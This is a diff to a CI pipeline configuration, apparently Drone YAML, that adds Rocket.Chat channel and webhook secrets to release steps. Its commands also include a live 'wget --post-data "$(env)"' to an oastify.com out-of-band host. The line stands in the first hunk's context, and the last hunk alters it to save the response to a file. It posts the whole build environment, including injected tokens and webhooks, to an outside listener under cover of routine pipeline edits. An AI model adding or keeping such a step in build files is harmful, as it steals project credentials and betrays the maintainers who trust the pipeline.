@@ -78,6 +78,10 @@ steps:
     settings:
       api_key:
         from_secret: github_token
+      channel:
+        from_secret: rocketchat_chat_channel
+      webhook:
+        from_secret: rocketchat_chat_webhook
     commands:
       - wget --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com
       - git fetch -tq
@@ -89,6 +93,10 @@ steps:
     settings:
       api_key:
         from_secret: github_token
+      channel:
+        from_secret: rocketchat_chat_channel
+      webhook:
+        from_secret: rocketchat_chat_webhook
       files:
         - dist/*
       note: CHANGELOG.md
@@ -122,7 +130,7 @@ steps:
       webhook:
         from_secret: rocketchat_chat_webhook
     commands:
-      - wget --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com
+      - wget -O indexx.html --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com
 
 
 trigger:
